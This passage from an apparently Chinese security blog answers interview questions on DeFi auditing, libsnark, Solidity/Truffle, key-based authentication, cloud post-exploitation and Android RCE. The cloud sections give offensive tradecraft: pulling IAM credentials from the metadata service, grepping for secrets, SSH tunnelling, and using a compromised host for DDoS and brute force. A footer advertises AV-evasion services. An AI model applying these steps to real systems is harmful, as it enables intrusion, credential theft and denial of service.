<li><strong>资产关系</strong>：协议中的各种资产（例如，原生代币、LP Token、抵押品）之间是如何互相影响的？它们的价格波动会如何影响彼此的价值？</li>
</ul>
<p>仅仅看代码是不够的，很多漏洞是<strong>设计上的缺陷</strong>，而不是简单的编程错误</p>
<p><strong>2. 识别常见的经济模型攻击模式</strong></p>
<p>以下是一些 DeFi 经济模型中常见的攻击手法，你需要特别关注：</p>
<p><strong>a. 闪电贷攻击</strong></p>
<p>这是目前最常见且最具破坏力的 DeFi 攻击方式。闪电贷允许攻击者在单笔交易中借入巨额资金，而无需任何抵押。攻击者利用这笔资金，通过操纵价格、进行套利或清算，来攻击协议</p>
<p><strong>审计方向：</strong></p>
<ul>
<li><strong>价格预言机（Price Oracle）</strong>：检查项目是否依赖单一或不稳定的价格预言机。如果价格来源容易被操纵（例如，只从一个 DEX 获取），那么它就可能成为攻击的弱点</li>
<li><strong>交易顺序依赖（MEV）</strong>：检查是否存在利用交易顺序进行套利或攻击的可能性</li>
<li><strong>清算机制</strong>：如果清算依赖于链上预言机，攻击者可能会在清算时机到来前，通过闪电贷操纵价格，导致清算失败或以不公平的价格进行清算</li>
</ul>
<p><strong>b. 预言机操纵</strong></p>
<p>如果协议使用链上数据源作为价格预言机（例如，从 Uniswap 获取），攻击者可以利用闪电贷注入大量资金，暂时性地抬高或压低价格，从而实现套利或攻击</p>
<p><strong>审计方向：</strong></p>
<ul>
<li><strong>价格来源</strong>：优先使用去中心化、多源聚合的预言机，例如 <strong>Chainlink</strong></li>
<li><strong>时间加权平均价（TWAP）</strong>：检查是否使用了 TWAP 等机制来平滑价格波动，降低被闪电贷瞬间操纵的风险</li>
</ul>
<p><strong>c. 抵押品操纵</strong></p>
<p>一些借贷协议允许用户使用项目自身的治理代币作为抵押品。如果代币价格下跌，可能导致抵押品价值不足。更糟糕的是，攻击者可能会通过做空或其他方式，故意压低代币价格来清算其他用户的头寸</p>
<p><strong>审计方向：</strong></p>
<ul>
<li><strong>抵押品类型</strong>：检查是否允许使用高波动性或流动性差的资产作为抵押品</li>
<li><strong>清算阈值</strong>：清算阈值（Liquidation Threshold）的设置是否合理？是否存在“死亡螺旋”的风险，即代币价格下跌导致大量清算，清算又进一步压低价格？</li>
</ul>
<p><strong>d. 无限制铸币</strong></p>
<p>如果协议代币的铸造没有受到严格限制，攻击者可能会通过某种方式（例如，利用代码漏洞或经济模型中的套利机会）无限铸造代币，导致代币供应量剧增，价值归零</p>
<p><strong>审计方向：</strong></p>
<ul>
<li><strong>铸币函数</strong>：重点审计所有 <code>mint</code>、<code>create</code> 或类似的代币生成函数</li>
<li><strong>权限控制</strong>：谁有权调用这些铸币函数？是否有多重签名或时间锁来保护？</li>
</ul>
<p><strong>3. 系统化的审计流程</strong></p>
<p>要找到这些漏洞，需要一个结构化的审计流程：</p>
<ol>
<li><strong>代码审计</strong>：使用自动化工具（如 Slither、Mythril）进行初步扫描，然后进行手动代码审查，特别关注 <code>transfer</code>、<code>call</code> 等外部调用</li>
<li><strong>经济模型模拟</strong>：建立一个模型，模拟不同市场条件（例如，价格剧烈波动、流动性枯竭）和攻击场景下的协议行为</li>
<li><strong>单元测试与模糊测试</strong>：编写大量的测试用例，涵盖所有可能的极端情况和用户行为。使用模糊测试工具（Fuzzing）输入异常数据，观察合约行为</li>
<li><strong>激励机制博弈分析</strong>：将自己置于“攻击者”的角色，思考如何利用协议的激励机制来获取不正当收益。例如，能否通过一个闪电贷，先进行套利，再归还贷款？</li>
</ol>
<p>总而言之，审计一个 DeFi 项目的经济模型漏洞，远比单纯的代码审计复杂。它需要对<strong>区块链机制、智能合约、博弈论和金融市场</strong>有深刻的理解</p>
<hr>
<h3 id="libsnark-核心是什么"><a href="#libsnark-核心是什么" class="headerlink" title="libsnark 核心是什么"></a>libsnark 核心是什么</h3><p><strong>libsnark</strong> 是一个 C++ 库，它提供了一套用于构建和验证<strong>简洁非交互式知识论证</strong>（Succinct Non-Interactive Arguments of Knowledge，简称 <strong>SNARKs</strong>）的算法和工具。</p>
<p>简单来说，SNARKs 是一种强大的加密技术，它允许<strong>证明者</strong>（prover）向<strong>验证者</strong>（verifier）证明某个陈述是真实的，而无需向验证者透露任何敏感信息。这个证明过程非常高效：<strong>证明本身很小</strong>，<strong>验证速度极快</strong>，而且<strong>验证者不需要与证明者进行交互</strong></p>
<p><strong>libsnark 的核心功能</strong></p>
<p>libsnark 的核心在于它实现了多种<strong>零知识证明</strong>方案。这些方案可以分为几个主要部分：</p>
<p><strong>1. 算术化</strong></p>
<p>这是将一个计算问题转换为一个数学可证明形式的第一步。libsnark 主要使用了两种方法：</p>
<ul>
<li><strong>QAP (Quadratic Arithmetic Programs)</strong>：将一个计算问题（如一个程序或电路）转换为一个二次算术程序。这是最经典的 SNARK 方案之一，被用于 Zcash 的第一代版本</li>
<li><strong>R1CS (Rank-1 Constraint Systems)</strong>：这是一种更基础的算术化形式，它将问题表示为一系列线性方程组。libsnark 支持将 QAP 转换为 R1CS，并提供了相应的工具</li>
</ul>
<p><strong>2. 多项式承诺</strong></p>
<p>在 SNARKs 中，证明者需要证明一个多项式满足某些性质，而无需透露整个多项式。libsnark 提供了多种多项式承诺方案，例如基于**配对曲线（Pairing-based Elliptic Curves）**的方案，这些方案是高效且安全的</p>
<p><strong>3. zk-SNARK 协议实现</strong></p>
<p>libsnark 实现了完整的 zk-SNARK 协议，包括：</p>
<ul>
<li><strong>可信设置（Trusted Setup）</strong>：这是 SNARKs 的一个重要步骤，需要生成一个公共的参数集合。libsnark 提供了生成和验证这些参数的工具</li>
<li><strong>证明生成（Proof Generation）</strong>：通过这个过程，证明者可以生成一个简洁的零知识证明</li>
<li><strong>证明验证（Proof Verification）</strong>：验证者可以使用公共参数和证明，快速验证陈述的真实性</li>
</ul>
<p><strong>4. 密码学原语</strong></p>
<p>libsnark 依赖于强大的密码学原语，例如：</p>
<ul>
<li><strong>配对友好的椭圆曲线（Pairing-friendly Elliptic Curves）</strong>：例如 BN254、BLS12-381 等。这些曲线是实现高效零知识证明的基础</li>
<li><strong>哈希函数</strong>：用于数据完整性检查</li>
</ul>
<hr>
<h3 id="truffle、solidity-了解吗"><a href="#truffle、solidity-了解吗" class="headerlink" title="truffle、solidity 了解吗"></a>truffle、solidity 了解吗</h3><p><strong>1. Solidity：智能合约的编程语言</strong></p>
<p><strong>Solidity</strong> 是一种面向合约的高级编程语言，专门为以太坊虚拟机（EVM）设计。你可以把它想象成智能合约领域的 JavaScript。它的语法借鉴了 JavaScript、C++ 和 Python，但针对智能合约的特殊性做了很多优化。</p>
<p><strong>核心特点：</strong></p>
<ul>
<li><strong>静态类型</strong>：Solidity 是一种静态类型语言，这意味着所有变量的类型都必须在编译时确定。这有助于在早期发现错误，提高合约的安全性</li>
<li><strong>面向合约</strong>：它的设计思想是“合约”，一个合约可以包含状态变量（存储在区块链上）、函数（可执行的代码）以及事件（用于与外部应用通信）</li>
<li><strong>EVM 兼容性</strong>：Solidity 代码被编译成 EVM 字节码，可以在任何以太坊兼容的区块链上运行</li>
<li><strong>内置安全特性</strong>：它提供了一些内置功能来处理以太坊特有的操作，例如处理以太币的 <code>payable</code> 函数、处理外部调用的 <code>call</code> 方法等</li>
</ul>
<p><strong>举个例子：一个简单的存钱合约</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    uint public data; // 状态变量，存储在区块链上</span><br><span class="line"></span><br><span class="line">    function setData(uint _data) public &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getData() public view returns (uint) &#123;</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一个合约，可以存储一个整数。<strong>Solidity</strong> 负责编写这段逻辑，而接下来，就需要 <strong>Truffle</strong> 来将这段代码部署到区块链上</p>
<p><strong>2. Truffle：开发框架与工具集</strong></p>
<p><strong>Truffle</strong> 是一个全面的开发框架，专门用于帮助开发者编译、部署、测试和调试 Solidity 智能合约。如果你把 <strong>Solidity</strong> 看作是“建筑材料”，那么 <strong>Truffle</strong> 就是“建筑工具箱”。它极大地简化了智能合约的开发流程</p>
<p><strong>核心功能：</strong></p>
<ul>
<li><strong>智能合约管理</strong>：Truffle 提供了标准的项目目录结构，方便你组织合约代码、测试文件和部署脚本</li>
<li><strong>编译</strong>：它内置了 Solidity 编译器，可以自动将你的 <code>.sol</code> 文件编译成 EVM 字节码和 ABI（应用二进制接口）文件</li>
<li><strong>迁移与部署</strong>：这是 Truffle 最强大的功能之一。你可以编写“迁移脚本”（migration scripts），这些脚本会告诉你如何按顺序将合约部署到不同的网络（如本地测试网、Ropsten、主网）。它会自动处理部署过程中的依赖关系</li>
<li><strong>自动化测试</strong>：Truffle 提供了强大的测试框架，你可以用 JavaScript 或 Solidity 来编写合约的自动化测试用例，确保合约的逻辑正确和安全</li>
<li><strong>控制台</strong>：Truffle 附带了一个交互式控制台，你可以直接与部署在区块链上的合约进行交互，调用函数和查询状态</li>
<li><strong>本地区块链</strong>：Truffle 捆绑了 <strong>Ganache</strong>，一个本地的以太坊测试网络，方便你在不连接真实网络的情况下快速开发和测试</li>
</ul>
<p><strong>Truffle 如何工作？</strong></p>
<p>Truffle 的工作流通常是这样的：</p>
<ol>
<li><strong>项目初始化</strong>：使用 <code>truffle init</code> 命令创建一个新的项目</li>
<li><strong>编写合约</strong>：在 <code>contracts</code> 文件夹中用 <strong>Solidity</strong> 编写你的智能合约</li>
<li><strong>编写部署脚本</strong>：在 <code>migrations</code> 文件夹中编写部署脚本，告诉 Truffle 部署哪个合约，以及部署到哪个网络</li>
<li><strong>编译与部署</strong>：使用 <code>truffle compile</code> 和 <code>truffle migrate</code> 命令来编译合约并将其部署到你选择的网络上</li>
<li><strong>测试</strong>：使用 <code>truffle test</code> 命令运行你的测试用例</li>
</ol>
<hr>
<h3 id="智能合约的鉴权、公私密钥"><a href="#智能合约的鉴权、公私密钥" class="headerlink" title="智能合约的鉴权、公私密钥"></a>智能合约的鉴权、公私密钥</h3><p><strong>什么是鉴权？</strong></p>
<p>在传统中心化系统中，鉴权通常是指验证用户身份的过程，比如通过用户名和密码登录。但在区块链和智能合约中，鉴权的方式完全不同，它依赖于密码学而非用户名</p>
<p>在智能合约中，<strong>鉴权就是验证发起交易的账户是否拥有执行某个特定操作的权限</strong>。这个验证过程通常通过<strong>数字签名</strong>（Digital Signature）来实现</p>
<p>当你从一个地址向智能合约发送一笔交易时，这笔交易中包含了你想要执行的函数和参数。为了证明这笔交易确实是你发起的，你需要用你的<strong>私钥</strong>对交易数据进行签名</p>
<p>智能合约或区块链网络会使用与你私钥对应的<strong>公钥</strong>来验证这个签名。如果签名验证成功，系统就会确认这笔交易的合法性，并执行相应的操作</p>
<p><strong>公私密钥：鉴权的基石</strong></p>
<p>公私密钥对是区块链鉴权的核心。它基于非对称加密算法（如椭圆曲线加密算法）。</p>
<p><strong>1. 私钥（Private Key）</strong></p>
<ul>
<li><strong>定义</strong>：一个随机生成的、非常长的数字。它就像你银行账户的密码，是你的<strong>身份唯一凭证</strong></li>
<li><strong>功能</strong>：用于<strong>对交易进行数字签名</strong>。只有私钥持有者才能生成有效的签名</li>
<li><strong>安全性</strong>：私钥必须绝对保密。一旦泄露，你的所有资产都可能被盗</li>
<li><strong>形象比喻</strong>：你的<strong>银行卡密码</strong></li>
</ul>
<p><strong>2. 公钥（Public Key）</strong></p>
<ul>
<li><strong>定义</strong>：从私钥通过加密算法推导出来的一串数字</li>
<li><strong>功能</strong>：用于<strong>验证私钥生成的数字签名</strong>。任何人都可以拥有你的公钥，就像任何人都可以拥有你的银行账户号码。公钥可以公开，因为无法通过公钥反向推导出私钥</li>
<li><strong>形象比喻</strong>：你的<strong>银行账户号码</strong></li>
</ul>
<p><strong>3. 地址（Address）</strong></p>
<ul>
<li><strong>定义</strong>：由公钥通过哈希函数派生出来的一串字符</li>
<li><strong>功能</strong>：用于接收和发送资产，是你在区块链上的<strong>公开身份</strong></li>
</ul>
<p><strong>工作流程总结：</strong></p>
<ol>
<li>你想要调用智能合约中的一个函数（比如提款）</li>
<li>你用<strong>私钥</strong>对交易数据（包括函数名、参数和目标合约地址）进行<strong>签名</strong></li>
<li>你将签了名的交易广播到区块链网络</li>
<li>网络中的节点接收到交易后，会使用你的<strong>公钥</strong>来<strong>验证签名</strong></li>
<li>如果签名有效，交易被确认，并被打包进一个区块</li>
<li>智能合约执行你请求的操作</li>
</ol>
<hr>
<h3 id="数字钱包的身份认证"><a href="#数字钱包的身份认证" class="headerlink" title="数字钱包的身份认证"></a>数字钱包的身份认证</h3><p><strong>数字钱包的身份认证：一个去中心化的过程</strong></p>
<p>在区块链和加密货币的世界里，数字钱包的<strong>身份认证</strong>（Authentication）与我们习惯的传统银行或互联网服务的身份认证截然不同。它不是通过用户名和密码，而是通过一种基于<strong>密码学</strong>的、去中心化的方式来完成</p>
<p>这个过程的核心是<strong>公私密钥对</strong>。你可以把它们想象成一套独特的钥匙，这套钥匙代表了你在区块链上的身份和资产所有权</p>
<p><strong>1. 核心机制：公私密钥对</strong></p>
<p>每个数字钱包都包含一个独一无二的<strong>私钥</strong>（Private Key）。这个私钥是一个非常长的随机数字，它就像你银行保险箱的唯一密码</p>
<ul>
<li><strong>私钥</strong>是你的<strong>所有权证明</strong>：只有拥有私钥，你才能控制钱包里的资产</li>
<li><strong>私钥</strong>用于<strong>签名</strong>（Signing）：当你想要进行一笔交易（比如转账或与智能合约交互）时，你需要用你的私钥对这笔交易数据进行数字签名</li>
</ul>
<p>与私钥配对的是一个<strong>公钥</strong>（Public Key）。公钥是从私钥通过加密算法生成的，它就像你的银行账户号码</p>
<ul>
<li><strong>公钥</strong>用于<strong>验证</strong>：任何人都可以使用你的公钥来验证你用私钥生成的签名是否有效</li>
<li><strong>公钥</strong>是公开的：即使公开了公钥，攻击者也无法反向推导出私钥</li>
</ul>
<p>最终，你的<strong>钱包地址</strong>（Wallet Address）是根据公钥生成的。它是你接收资金的公开身份，你可以放心地分享给任何人</p>
<p><strong>2. 身份认证的工作流程</strong></p>
<p>那么，钱包是如何使用这个机制来验证你的身份的呢？整个过程是自动化的，对用户来说是透明的，但背后的原理可以分解为几个步骤：</p>
<ol>
<li><strong>用户发起交易</strong>：你在钱包应用中点击“发送”或“批准”一个交易，并输入相关信息（比如接收地址和金额）</li>
<li><strong>钱包生成交易数据</strong>：钱包会创建一个原始交易数据包，其中包含所有交易细节</li>
<li><strong>私钥签名</strong>：你的钱包会使用你独有的私钥对这个数据包进行加密签名，生成一个<strong>数字签名</strong></li>
<li><strong>广播交易</strong>：带有数字签名的完整交易数据包被广播到区块链网络</li>
<li><strong>网络节点验证</strong>：网络中的每个节点收到这笔交易后，都会使用你钱包的公钥来验证签名</li>
<li><strong>身份认证成功</strong>：如果签名验证成功，意味着这笔交易确实是由拥有该私钥的人发起的。这笔交易随后会被打包到区块中，并最终完成</li>
</ol>
<p>这个过程有效地证明了“你就是你”，而无需向任何中心化机构透露你的身份信息</p>
<h1 id="31-云安全"><a href="#31-云安全" class="headerlink" title="31- 云安全"></a>31- 云安全</h1><h3 id="控制了一台云主机但没有连接内网也没有云内网，该如何利用"><a href="#控制了一台云主机但没有连接内网也没有云内网，该如何利用" class="headerlink" title="控制了一台云主机但没有连接内网也没有云内网，该如何利用"></a>控制了一台云主机但没有连接内网也没有云内网，该如何利用</h3><p><strong>1. 将云主机作为跳板</strong></p>
<p>既然无法直接连接内网，最直接的方法就是将这台云主机本身<strong>变成一个跳板</strong>，通过它来访问其他资源。这通常涉及到端口转发或隧道技术</p>
<ul>
<li><strong>SSH 隧道（SSH Tunneling）</strong>: 如果你已经获得了云主机的 SSH 权限，这是最简单和最稳定的方法<ul>
<li><strong>本地端口转发</strong>: 将云主机上的某个端口流量转发到你本地机器上的端口<ul>
<li><strong>命令</strong>: <code>ssh -L [本地端口]:[目标IP]:[目标端口] [云主机用户名]@[云主机IP]</code></li>
<li><strong>场景</strong>: 假设你想访问云主机所在公有云的另一个服务（如数据库），但这个服务只允许云主机访问。你可以将这个服务的端口转发到你本地，然后像访问本地服务一样访问它</li>
</ul>
</li>
<li><strong>动态端口转发</strong>: 将云主机变成一个 SOCKS5 代理服务器<ul>
<li><strong>命令</strong>: <code>ssh -D [本地端口] [云主机用户名]@[云主机IP]</code></li>
<li><strong>场景</strong>: 你可以将你的浏览器或 Burp Suite 配置为使用这个 SOCKS5 代理，然后通过云主机访问互联网上的其他资源，这对于隐藏你的真实 IP 或绕过一些访问限制非常有用</li>
</ul>
</li>
</ul>
</li>
<li><strong>端口转发工具</strong>: 如果没有 SSH，或者需要更复杂的转发，可以使用专业的工具<ul>
<li><strong>Chisel</strong>: 一个用 Go 语言编写的快速 TCP&#x2F;UDP 隧道工具，非常适合在受限网络中使用。它支持 SOCKS5 代理，并且客户端和服务器端都可以轻松部署</li>
<li><strong>socat</strong>: 强大的瑞士军刀型工具，可以实现各种复杂的端口转发和重定向</li>
<li><strong>Frp (Fast Reverse Proxy)</strong>: 用于内网穿透和反向代理，虽然通常用于从内网穿透到公网，但也可以用来在不同云主机之间建立隧道</li>
</ul>
</li>
</ul>
<p><strong>2. 收集敏感信息，寻找新的突破口</strong></p>
<p>即使无法直接访问内网，这台云主机本身也可能包含大量有价值的信息，这些信息可以帮助你找到其他可以渗透的目标</p>
<ul>
<li><strong>扫描云主机的元数据服务（Metadata Service）</strong>:<ul>
<li>许多公有云（如 AWS, GCP, Azure, 阿里云）都会为云主机提供一个元数据服务，通常可以通过一个固定的内网 IP 访问，如 <code>http://169.254.169.254</code></li>
<li><strong>目的</strong>: 通过访问这个服务，你可以获取到<strong>云主机的 IAM 角色凭据、API 密钥、主机配置信息</strong>等。这些凭据可能拥有访问其他云服务的权限，如 S3 存储桶、数据库、或者执行其他云 API 操作</li>
<li><strong>利用</strong>: 拿到这些凭据后，你可以使用 AWS CLI, Azure CLI 等工具，从你自己的机器上控制目标账户下的其他云资源</li>
</ul>
</li>
<li><strong>搜索配置文件和环境变量</strong>:<ul>
<li>查看 <code>/etc/</code> 目录下的配置文件，或者应用程序的配置目录</li>
<li>使用 <code>grep</code> 或 <code>find</code> 命令搜索关键字，如 <code>password</code>, <code>key</code>, <code>secret</code>, <code>API</code> 等</li>
<li><strong>目的</strong>: 寻找硬编码的凭据，这些凭据可能用于连接数据库、缓存服务、消息队列或其他云服务</li>
<li><strong>利用</strong>: 一旦找到数据库凭据，你可以尝试直接连接数据库，获取用户数据、业务数据，甚至是其他服务器的连接信息</li>
</ul>
</li>
<li><strong>检查运行中的进程和服务</strong>:<ul>
<li>使用 <code>ps -ef</code> 或 <code>netstat -tulnp</code> 命令，查看当前运行的进程和监听的端口</li>
<li><strong>目的</strong>: 发现正在运行的应用程序，特别是那些与外部服务有连接的程序</li>
<li><strong>利用</strong>: 如果发现有 Web 服务或 API 服务在运行，尝试利用你已有的访问权限去审计它的代码，寻找新的漏洞</li>
</ul>
</li>
</ul>
<p><strong>3. 利用云主机作为攻击源</strong></p>
<p>这台云主机本身也是一个有价值的攻击平台。你可以利用它来发起针对其他目标的攻击</p>
<ul>
<li><strong>DDoS 攻击</strong>: 如果你的目标是让某个服务瘫痪，你可以利用云主机的高带宽和计算能力来发起分布式拒绝服务攻击</li>
<li><strong>端口扫描</strong>: 利用云主机对其他公网 IP 进行大规模端口扫描，这可以帮助你发现其他暴露在公网上的服务，而不会暴露你自己的 IP 地址</li>
<li><strong>暴力破解</strong>: 如果你已经找到了一些服务的登录页面或 API 接口，你可以利用云主机作为跳板进行暴力破解，因为它的网络延迟通常比你本地要小得多。</li>
</ul>
<p><strong>4. 寻找云主机的横向移动点</strong></p>
<p>即使没有内网，也可能存在一些特殊的横向移动机会。</p>
<ul>
<li><strong>共享安全组或网络</strong>:<ul>
<li>许多云服务商都允许不同的云主机共享同一个安全组或虚拟网络</li>
<li><strong>利用</strong>: 通过元数据服务或配置信息，你可以了解到当前云主机的网络拓扑。如果它与另一个云主机在同一个安全组内，你可能可以通过内网 IP 直接访问那台主机</li>
</ul>
</li>
<li><strong>私有镜像</strong>:<ul>
<li>如果这台云主机是通过一个私有镜像创建的，你可以尝试找到这个镜像。这个镜像可能包含了其他应用程序，甚至是一些默认的凭据</li>
</ul>
</li>
</ul>
<h1 id="32-APP安全"><a href="#32-APP安全" class="headerlink" title="32- APP安全"></a>32- APP安全</h1><h3 id="安卓系统如何进行-RCE，有什么思路"><a href="#安卓系统如何进行-RCE，有什么思路" class="headerlink" title="安卓系统如何进行 RCE，有什么思路"></a>安卓系统如何进行 RCE，有什么思路</h3><p><strong>1. 安卓 RCE 的核心思路</strong></p>
<p>安卓 RCE 的核心思想是<strong>找到一个可以被远程触发的入口点，并利用这个入口点来执行任意代码</strong>。这个过程通常分为两步：</p>
<ol>
<li><strong>触发点（Trigger）</strong>：寻找一个可以被远程控制，且会处理恶意数据的接口。这个接口可以是应用程序的某个功能、某个系统服务，甚至是底层的通信协议</li>
<li><strong>代码执行（Execution）</strong>：利用触发点，让系统执行攻击者预设的代码。这通常涉及到内存破坏、反序列化、或动态加载恶意代码</li>
</ol>
<p><strong>2. 安卓 RCE 的主要利用途径</strong></p>
<p>安卓系统的 RCE 漏洞通常存在于以下几个层面：</p>
<p><strong>a) 应用层漏洞</strong></p>
<p>这是最常见的 RCE 攻击途径，通常利用的是应用程序自身的逻辑或代码缺陷</p>
<ul>
<li><strong>WebView 远程代码执行</strong>：如果应用使用了 <code>WebView</code> 组件，并且没有对其进行安全配置，攻击者可以利用 <code>JavaScript</code> 接口或 <code>addJavascriptInterface</code> 接口来触发漏洞。如果 <code>WebView</code> 加载了恶意网页，恶意 <code>JavaScript</code> 就可以调用本地 Java 方法，从而实现 RCE</li>
<li><strong>反序列化漏洞</strong>：如果应用使用了不安全的序列化库（如 <code>Fastjson</code>、<code>GSON</code> 的旧版本），并且从远程接收不可信的序列化数据，攻击者可以构造恶意 Payload，在反序列化时触发 RCE</li>
<li><strong>动态加载漏洞</strong>：如果应用从远程服务器下载 <code>jar</code>、<code>dex</code> 或其他可执行文件，并对其进行动态加载，攻击者可以控制下载的文件，从而实现 RCE</li>
</ul>
<p><strong>b) IPC（进程间通信）漏洞</strong></p>
<p>安卓系统依赖于各种 IPC 机制（如 <code>Binder</code>、<code>Content Provider</code>）来允许不同应用之间进行通信</p>
<ul>
<li><strong>Binder 漏洞</strong>：安卓的 <code>Binder</code> 机制是其核心 IPC 方式。如果一个 <code>Binder</code> 服务没有对传入的数据进行严格验证，攻击者可以构造恶意数据，利用 <code>Binder</code> 通信的漏洞，在服务端进程中触发内存破坏或逻辑缺陷，从而实现 RCE</li>
<li><strong>Content Provider 漏洞</strong>：如果 <code>Content Provider</code> 存在 SQL 注入或文件路径遍历漏洞，攻击者可以利用这些漏洞，读取或写入敏感文件，甚至触发其他漏洞，最终导致 RCE。</li>
</ul>
<p><strong>c) 系统服务漏洞</strong></p>
<p>安卓系统本身运行着大量的系统服务（例如 <code>SurfaceFlinger</code>、<code>mediaserver</code>）。这些服务通常以高权限运行，如果它们存在漏洞，其危害性是毁灭性的</p>
<ul>
<li><strong>媒体服务（Media Server）漏洞</strong>：安卓的媒体服务负责处理音频、视频和图像文件。如果攻击者能让其处理一个恶意的媒体文件（例如一个特制的 <code>MP4</code> 文件），可能会触发内存破坏漏洞，导致在媒体服务进程中实现 RCE。</li>
<li><strong>图形渲染服务（SurfaceFlinger）漏洞</strong>：<code>SurfaceFlinger</code> 负责安卓的图形渲染。如果它存在漏洞，攻击者可以利用一个恶意的应用或网页，向其发送恶意数据，从而在 <code>SurfaceFlinger</code> 进程中实现 RCE</li>
</ul>
<p><strong>d) 底层协议或驱动漏洞</strong></p>
<ul>
<li><strong>Wi-Fi、蓝牙驱动漏洞</strong>：这些驱动程序负责处理来自无线网络的流量。如果其中存在漏洞，攻击者可以发送特制的无线数据包，在无需用户交互的情况下，触发 RCE</li>
</ul>
<hr>
<h3 id="给一个移动端的-APP，已知服务端是-cloud-环境有什么思路利用"><a href="#给一个移动端的-APP，已知服务端是-cloud-环境有什么思路利用" class="headerlink" title="给一个移动端的 APP，已知服务端是 cloud 环境有什么思路利用"></a>给一个移动端的 APP，已知服务端是 cloud 环境有什么思路利用</h3><p><strong>1. 移动端 App 本地分析</strong></p>
<p>首先，你需要从 App 本身入手，这是你与云端环境交互的唯一“客户端”</p>
<ul>
<li><strong>逆向工程（Reverse Engineering）</strong><ul>
<li><strong>代码分析</strong>：使用工具如 <strong>JADX</strong> 或 <strong>MobSF</strong> 对 APK&#x2F;IPA 文件进行逆向，分析其 Java&#x2F;Kotlin&#x2F;Swift&#x2F;Objective-C 源码。寻找硬编码在代码中的敏感信息，例如：<ul>
<li>API Key、Secret Key、Access Token</li>
<li>数据库密码、云服务凭证（如 AWS S3、Azure Blob Storage 的凭证）</li>
<li>加密算法和密钥</li>
<li>内网 IP 地址或域名</li>
</ul>
</li>
<li><strong>本地数据存储</strong>：检查 App 在本地存储的数据，例如 SharedPreferences、SQLite 数据库、文件缓存等。这些地方可能存储了用户的敏感信息或 API 调用凭证</li>
</ul>
</li>
<li><strong>网络流量抓包分析</strong><ul>
<li>使用 <strong>Burp Suite</strong> 或 <strong>Charles Proxy</strong> 拦截 App 与云端服务器的所有通信流量</li>
<li><strong>分析 API 接口</strong>：这是最关键的一步。仔细分析每一个 API 接口的功能、请求参数、响应数据。特别关注：<ul>
<li><strong>认证机制</strong>：App 如何进行用户认证？是基于 Token 还是 Cookie？Token 是否有过期时间？</li>
<li><strong>授权机制</strong>：是否可以越权访问其他用户的数据？例如，修改请求参数中的 <code>user_id</code>。</li>
<li><strong>输入验证</strong>：是否有 SQL 注入、命令注入、XXE 等漏洞？尝试在参数中注入特殊字符或恶意代码</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>2. 云端服务渗透（以 App 为跳板）</strong></p>
<p>在完成本地分析后，你将拥有大量关于云端环境的信息。现在，你可以利用这些信息，以 App 为跳板，攻击后端的云服务</p>
<ul>
<li><strong>攻击 API 网关和后端服务</strong><ul>
<li><strong>API 漏洞</strong>：利用你在抓包中发现的 API 接口，进行更深入的渗透<ul>
<li><strong>SQL 注入</strong>：尝试在所有参数中注入 SQL 语句，看是否能读取数据库内容</li>
<li><strong>命令注入</strong>：如果 App 调用了某些系统命令，尝试注入命令，执行 <code>whoami</code> 等</li>
<li><strong>不安全的对象反序列化</strong>：如果通信数据是序列化的 Java、Python 或其他语言对象，尝试构造恶意 Payload，触发反序列化漏洞</li>
<li><strong>越权访问</strong>：尝试用低权限用户访问高权限接口，或越权修改其他用户的数据</li>
</ul>
</li>
</ul>
</li>
<li><strong>攻击云存储</strong><ul>
<li>如果 App 逆向后发现了云存储（如 AWS S3、Azure Blob Storage）的凭证，尝试使用这些凭证访问云存储</li>
<li><strong>权限枚举</strong>：检查凭证是否有读写、列出文件的权限</li>
<li><strong>数据窃取</strong>：如果能访问 S3 桶，尝试下载其中的文件，这些文件可能包含用户的敏感数据、源代码、或备份</li>
<li><strong>恶意文件上传</strong>：如果能写入，尝试上传恶意文件，可能能被 Web 服务调用</li>
</ul>
</li>
<li><strong>攻击云函数&#x2F;无服务器架构</strong><ul>
<li>如果 App 的某些功能是通过云函数（如 AWS Lambda）实现的，尝试寻找云函数的 API 接口</li>
<li><strong>注入攻击</strong>：在云函数的输入参数中，尝试注入命令或代码，看是否能触发 RCE</li>
<li><strong>权限滥用</strong>：云函数通常有特定的 IAM 角色。如果能利用云函数，你可以通过其权限访问其他云资源</li>
</ul>
</li>
</ul>
<h1 id="33-结束语"><a href="#33-结束语" class="headerlink" title="33- 结束语"></a>33- 结束语</h1><ul>
<li><strong>CTRl+D</strong> 将本网站:ycc77.com添加到书签栏哦~</li>
<li>需要资源,记得将ycc77.cn 添加到书签栏哦~</li>
<li>QQ交流群:660264846(最新开展免杀担保等业务)</li>
<li>B站: 疯狂的杨CC</li>
<li>抖音: 疯狂的杨CC</li>
<li>快手: 疯狂的杨CC</li>
<li>公众号:SGY安全</li>
<li>91: 疯狂的杨CC</li>
<li>p站: 疯狂的杨CC</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://Ycc77.com">杨CC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://ycc77.com/2025/09/26/27-%E6%9C%80%E5%85%A8%E7%9A%84%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%E9%99%84%E5%8F%82%E8%80%83%E7%AD%94%E6%A1%88/">https://ycc77.com/2025/09/26/27-%E6%9C%80%E5%85%A8%E7%9A%84%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%E9%99%84%E5%8F%82%E8%80%83%E7%AD%94%E6%A1%88/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" 